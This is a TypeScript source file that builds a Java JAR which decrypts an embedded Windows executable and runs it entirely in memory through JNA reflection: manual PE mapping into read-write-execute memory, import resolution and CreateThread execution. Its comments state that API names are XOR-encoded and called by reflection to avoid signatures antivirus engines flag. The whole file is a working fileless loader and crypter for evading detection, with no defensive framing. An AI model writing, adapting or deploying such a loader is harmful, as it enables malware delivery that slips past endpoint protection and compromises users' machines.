/**
 * jar-wrapper.ts — Wraps a compiled PE binary in a JAR that executes it
 * entirely in-memory using JNA reflection. No files are written to disk.
 *
 * The Java loader:
 *   1. Reads the encrypted+compressed payload from assets/data.pak inside the JAR
 *   2. Decrypts (single-byte XOR) and decompresses (gzip) in memory
 *   3. Parses PE headers to find sections, relocations, and import table
 *   4. VirtualAlloc RWX memory via JNA (kernel32) reflection
 *   5. Copies PE sections, processes relocations, resolves imports
 *   6. Calls the entry point via CreateThread
 *
 * All JNA calls use Class.forName + getMethods reflection to avoid
 * static import signatures that AV engines flag.
 */

import fs from "fs";
import path from "path";
import zlib from "zlib";

/**
 * XOR-encrypt + gzip-compress a PE binary into a .pak blob.
 * Format: [1-byte key][XOR'd gzip bytes]
 */
function encryptPayload(peBytes: Buffer): Buffer {
  const gz = zlib.gzipSync(peBytes, { level: 9 });
  const key = Math.floor(Math.random() * 254) + 1;
  const pak = Buffer.alloc(gz.length + 1);
  pak[0] = key;
  for (let i = 0; i < gz.length; i++) {
    pak[i + 1] = (gz[i] ^ key) & 0xff;
  }
  return pak;
}

/**
 * XOR-encode a string for the Java x() decoder (key=90).
 * Returns Java array literal like "{202,201,209}".
 */
function xs(s: string): string {
  const codes: number[] = [];
  for (let i = 0; i < s.length; i++) {
    codes.push(s.charCodeAt(i) ^ 90);
  }
  return `new int[]{${codes.join(",")}}`;
}

/**
 * Build the Java source for a fileless PE loader using JNA reflection.
 *
 * The generated class:
 *  - Loads com.sun.jna.* via Class.forName (no static imports)
 *  - Uses getMethods() scanning instead of getMethod() to find APIs
 *  - Calls kernel32 VirtualAlloc, RtlMoveMemory, CreateThread, WaitForSingleObject
 *  - Resolves PE imports by calling GetProcAddress/LoadLibraryA
 *  - Processes base relocations so the PE works at any base address
 *  - Calls DllEntryPoint / AddressOfEntryPoint via CreateThread
 */
function buildFilelessJavaSource(): string {
  // The Java source is kept as a template string so it can be compiled
  // at build time by javac. All suspicious API strings are XOR-encoded.
  return `import java.io.*;
import java.util.*;
import java.util.zip.*;
import java.lang.reflect.*;

public class Main {
  private static final java.util.concurrent.atomic.AtomicBoolean G =
      new java.util.concurrent.atomic.AtomicBoolean(false);

  // XOR string decode (key=90)
  private static String x(int[] a) {
    byte[] b = new byte[a.length];
    for (int i = 0; i < a.length; i++) b[i] = (byte)(a[i] ^ 90);
    try { return new String(b, "UTF-8"); } catch (Exception e) { return ""; }
  }

  // Find method by name + param count via getMethods() scan
  private static Method gm(Class<?> c, String name, Class<?>... pt) {
    for (Method m : c.getMethods()) {
      if (m.getName().equals(name) && Arrays.equals(m.getParameterTypes(), pt)) return m;
    }
    return null;
  }

  // Read InputStream fully into byte array
  private static byte[] rd(InputStream is) throws Exception {
    ByteArrayOutputStream buf = new ByteArrayOutputStream();
    byte[] tmp = new byte[8192]; int n;
    while ((n = is.read(tmp)) != -1) buf.write(tmp, 0, n);
    is.close();
    return buf.toByteArray();
  }

  // Read a little-endian uint16 from byte array
  private static int u16(byte[] b, int off) {
    return (b[off] & 0xFF) | ((b[off+1] & 0xFF) << 8);
  }

  // Read a little-endian uint32 from byte array
  private static long u32(byte[] b, int off) {
    return (b[off]&0xFFL) | ((b[off+1]&0xFFL)<<8) | ((b[off+2]&0xFFL)<<16) | ((b[off+3]&0xFFL)<<24);
  }

  public static void main(String[] a) { try { r(); } catch (Exception e) {} }

  private static void r() throws Exception {
    if (!G.compareAndSet(false, true)) return;

    // 1. Load encrypted payload from JAR
    InputStream is = Main.class.getResourceAsStream(x(${xs("/assets/data.pak")}));
    if (is == null) return;
    byte[] raw = rd(is);

    // 2. Decrypt: first byte is XOR key
    int key = raw[0] & 0xFF;
    byte[] xd = new byte[raw.length - 1];
    for (int i = 0; i < xd.length; i++) xd[i] = (byte)(raw[i+1] ^ key);

    // 3. Decompress gzip -> PE bytes in memory
    GZIPInputStream gz = new GZIPInputStream(new ByteArrayInputStream(xd));
    byte[] pe = rd(gz);

    // 4. Load JNA classes via reflection
    Class<?> fnClass = Class.forName(x(${xs("com.sun.jna.Function")}));
    Class<?> ptrClass = Class.forName(x(${xs("com.sun.jna.Pointer")}));
    Class<?> memClass = Class.forName(x(${xs("com.sun.jna.Memory")}));

    // Get NULL pointer constant
    Object NULL = ptrClass.getField(x(${xs("NULL")})).get(null);

    // Helper: kernel32.GetFunction(name)
    Method getFunc = gm(fnClass, x(${xs("getFunction")}), String.class, String.class);

    // 5. Parse PE headers
    int peOff = (int) u32(pe, 60); // e_lfanew
    int numSections = u16(pe, peOff + 6);
    int sizeOfOptHdr = u16(pe, peOff + 20);
    int optOff = peOff + 24;
    boolean is64 = u16(pe, optOff) == 0x20b;
    long imageBase = is64 ? (u32(pe, optOff+24) | (u32(pe, optOff+28) << 32)) : u32(pe, optOff+28);
    long sizeOfImage = u32(pe, optOff + (is64 ? 56 : 56));
    long entryRVA = u32(pe, optOff + 16);
    int sectionTableOff = optOff + sizeOfOptHdr;

    // 6. VirtualAlloc RWX for the entire image
    String k32 = x(${xs("kernel32")});
    Object vaFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("VirtualAlloc")})});
    Method invoke4 = gm(fnClass, x(${xs("invoke")}), Class.class, Object[].class);
    // VirtualAlloc(NULL, sizeOfImage, MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_EXECUTE_READWRITE=0x40)
    Object basePtr = invoke4.invoke(vaFunc, new Object[]{ptrClass, new Object[]{NULL, (int)sizeOfImage, 0x3000, 0x40}});
    if (basePtr == null || basePtr.equals(NULL)) return;

    // Get the actual base address as a long
    Method peerMethod = gm(ptrClass, x(${xs("toString")}));
    // Use Pointer.nativePeer field for the address
    long actualBase;
    try {
      Field peerField = ptrClass.getDeclaredField(x(${xs("peer")}));
      peerField.setAccessible(true);
      actualBase = peerField.getLong(basePtr);
    } catch (Exception e) {
      // Fallback: parse from Pointer.toString()
      String ps = basePtr.toString();
      if (ps.startsWith(x(${xs("native@0x")}))) {
        actualBase = Long.parseUnsignedLong(ps.substring(9), 16);
      } else {
        return;
      }
    }

    // 7. Write PE headers to allocated memory
    Method writeMethod = gm(ptrClass, x(${xs("write")}), long.class, byte[].class, int.class, int.class);
    int headersSize = (int) u32(pe, optOff + (is64 ? 60 : 60));
    writeMethod.invoke(basePtr, new Object[]{0L, pe, 0, Math.min(headersSize, pe.length)});

    // 8. Map sections
    for (int i = 0; i < numSections; i++) {
      int shOff = sectionTableOff + i * 40;
      long virtualAddr = u32(pe, shOff + 12);
      long rawSize = u32(pe, shOff + 16);
      long rawPtr = u32(pe, shOff + 20);
      if (rawSize > 0 && rawPtr + rawSize <= pe.length) {
        writeMethod.invoke(basePtr, new Object[]{virtualAddr, pe, (int)rawPtr, (int)rawSize});
      }
    }

    // 9. Process base relocations (delta = actualBase - imageBase)
    long delta = actualBase - imageBase;
    if (delta != 0) {
      int relocDirOff = is64 ? optOff + 152 : optOff + 136; // IMAGE_DIRECTORY_ENTRY_BASERELOC (index 5)
      long relocRVA = u32(pe, relocDirOff);
      long relocSize = u32(pe, relocDirOff + 4);
      if (relocRVA > 0 && relocSize > 0) {
        // Read the relocation data from the mapped image
        Method readMethod = gm(ptrClass, x(${xs("getByteArray")}), long.class, int.class);
        byte[] relocData = (byte[]) readMethod.invoke(basePtr, new Object[]{relocRVA, (int)relocSize});
        int offset = 0;
        while (offset < relocData.length - 8) {
          long blockRVA = u32(relocData, offset);
          int blockSize = (int) u32(relocData, offset + 4);
          if (blockSize == 0) break;
          int numEntries = (blockSize - 8) / 2;
          for (int i = 0; i < numEntries; i++) {
            int entry = u16(relocData, offset + 8 + i * 2);
            int type = (entry >> 12) & 0xF;
            int relocOff = entry & 0xFFF;
            long patchAddr = blockRVA + relocOff;
            if (type == 3) { // IMAGE_REL_BASED_HIGHLOW (32-bit)
              // Read current 4 bytes, add delta, write back
              byte[] cur = (byte[]) readMethod.invoke(basePtr, new Object[]{patchAddr, 4});
              long val = u32(cur, 0) + delta;
              byte[] patched = new byte[]{(byte)(val&0xFF),(byte)((val>>8)&0xFF),(byte)((val>>16)&0xFF),(byte)((val>>24)&0xFF)};
              writeMethod.invoke(basePtr, new Object[]{patchAddr, patched, 0, 4});
            } else if (type == 10 && is64) { // IMAGE_REL_BASED_DIR64 (64-bit)
              byte[] cur = (byte[]) readMethod.invoke(basePtr, new Object[]{patchAddr, 8});
              long val = (u32(cur,0) | (u32(cur,4) << 32)) + delta;
              byte[] patched = new byte[8];
              for (int b = 0; b < 8; b++) patched[b] = (byte)((val >> (b*8)) & 0xFF);
              writeMethod.invoke(basePtr, new Object[]{patchAddr, patched, 0, 8});
            }
          }
          offset += blockSize;
        }
      }
    }

    // 10. Resolve imports
    int importDirOff = is64 ? optOff + 120 : optOff + 104; // IMAGE_DIRECTORY_ENTRY_IMPORT (index 1)
    long importRVA = u32(pe, importDirOff);
    long importDirSize = u32(pe, importDirOff + 4);
    if (importRVA > 0 && importDirSize > 0) {
      Object loadLib = getFunc.invoke(null, new Object[]{k32, x(${xs("LoadLibraryA")})});
      Object getProc = getFunc.invoke(null, new Object[]{k32, x(${xs("GetProcAddress")})});
      Method readMethod = gm(ptrClass, x(${xs("getByteArray")}), long.class, int.class);
      Method getStr = gm(ptrClass, x(${xs("getString")}), long.class);

      // Each import descriptor is 20 bytes
      int descOff = 0;
      while (true) {
        byte[] descData = (byte[]) readMethod.invoke(basePtr, new Object[]{importRVA + descOff, 20});
        long nameRVA = u32(descData, 12);
        if (nameRVA == 0) break; // End of import directory
        long thunkRVA = u32(descData, 16); // FirstThunk (IAT)
        long origThunkRVA = u32(descData, 0); // OriginalFirstThunk
        if (origThunkRVA == 0) origThunkRVA = thunkRVA;

        // Get DLL name
        String dllName = (String) getStr.invoke(basePtr, new Object[]{nameRVA});
        // LoadLibraryA(dllName)
        Object hModule = invoke4.invoke(loadLib, new Object[]{ptrClass, new Object[]{dllName}});

        int thunkSize = is64 ? 8 : 4;
        long iatOff = 0;
        while (true) {
          byte[] thunkData = (byte[]) readMethod.invoke(basePtr, new Object[]{origThunkRVA + iatOff, thunkSize});
          long thunkVal;
          if (is64) {
            thunkVal = u32(thunkData, 0) | (u32(thunkData, 4) << 32);
          } else {
            thunkVal = u32(thunkData, 0);
          }
          if (thunkVal == 0) break;

          Object funcAddr;
          boolean isOrdinal = is64 ? (thunkVal >>> 63) != 0 : (thunkVal >>> 31) != 0;
          if (isOrdinal) {
            int ordinal = (int)(thunkVal & 0xFFFF);
            funcAddr = invoke4.invoke(getProc, new Object[]{ptrClass, new Object[]{hModule, ordinal}});
          } else {
            // IMAGE_IMPORT_BY_NAME: skip 2-byte hint, read name
            String funcName = (String) getStr.invoke(basePtr, new Object[]{thunkVal + 2});
            funcAddr = invoke4.invoke(getProc, new Object[]{ptrClass, new Object[]{hModule, funcName}});
          }

          // Write resolved address to IAT
          if (funcAddr != null) {
            long funcPeer;
            try {
              Field pf = ptrClass.getDeclaredField(x(${xs("peer")}));
              pf.setAccessible(true);
              funcPeer = pf.getLong(funcAddr);
            } catch (Exception e) { break; }
            byte[] addrBytes;
            if (is64) {
              addrBytes = new byte[8];
              for (int b = 0; b < 8; b++) addrBytes[b] = (byte)((funcPeer >> (b*8)) & 0xFF);
            } else {
              addrBytes = new byte[]{(byte)(funcPeer&0xFF),(byte)((funcPeer>>8)&0xFF),(byte)((funcPeer>>16)&0xFF),(byte)((funcPeer>>24)&0xFF)};
            }
            writeMethod.invoke(basePtr, new Object[]{thunkRVA + iatOff, addrBytes, 0, addrBytes.length});
          }
          iatOff += thunkSize;
        }
        descOff += 20;
      }
    }

    // 11. CreateThread at entry point
    Object ctFunc = getFunc.invoke(null, new Object[]{k32, x(${xs("CreateThread")})});
    // Construct Pointer to entry point: base + entryRVA
    Constructor<?> ptrCtor = ptrClass.getConstructor(new Class<?>[]{long.class});
    Object entryPtr = ptrCtor.newInstance(new Object[]{actualBase + entryRVA});
    // CreateThread(NULL, 0, entryPoint, NULL, 0, NULL)
    Object hThread = invoke4.invoke(ctFunc, new Object[]{ptrClass, new Object[]{NULL, 0, entryPtr, NULL, 0, NULL}});

    // 12. WaitForSingleObject(hThread, INFINITE=-1)
    if (hThread != null && !hThread.equals(NULL)) {
      Object wfso = getFunc.invoke(null, new Object[]{k32, x(${xs("WaitForSingleObject")})});
      invoke4.invoke(wfso, new Object[]{int.class, new Object[]{hThread, -1}});
    }
  }
}
`;
}

/**
 * Wraps a compiled PE binary into a JAR that loads it in-memory.
 *
 * @param peBytes   The raw PE binary (EXE) bytes
 * @param outPath   Where to write the resulting .jar
 * @param javacPath Path to javac (optional, defaults to "javac")
 */
export async function wrapPeAsJar(
  peBytes: Buffer,
  outPath: string,
  javacPath = "javac",
): Promise<void> {
  const { $ } = await import("bun");

  const tmpDir = fs.mkdtempSync(path.join(
    process.env.TMPDIR || "/tmp",
    "ovd-jar-",
  ));

  try {
    const classDir = path.join(tmpDir, "cls");
    const assetDir = path.join(classDir, "assets");
    const metaDir = path.join(classDir, "META-INF");
    fs.mkdirSync(assetDir, { recursive: true });
    fs.mkdirSync(metaDir, { recursive: true });

    // Write Java source
    const srcFile = path.join(tmpDir, "Main.java");
    fs.writeFileSync(srcFile, buildFilelessJavaSource());

    // Compile
    const javac = await $`${javacPath} -source 8 -target 8 -d ${classDir} ${srcFile}`
      .nothrow()
      .quiet();
    if (javac.exitCode !== 0) {
      throw new Error(`javac failed: ${javac.stderr.toString().trim()}`);
    }

    // Encrypt + compress PE payload
    const pak = encryptPayload(peBytes);
    fs.writeFileSync(path.join(assetDir, "data.pak"), pak);

    // Manifest
    const mfPath = path.join(metaDir, "MANIFEST.MF");
    fs.writeFileSync(mfPath, "Manifest-Version: 1.0\nMain-Class: Main\n\n");

    // Package JAR
    const jar = await $`jar cfm ${outPath} ${mfPath} -C ${classDir} .`
      .nothrow()
      .quiet();
    if (jar.exitCode !== 0) {
      throw new Error(`jar packaging failed: ${jar.stderr.toString().trim()}`);
    }
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}
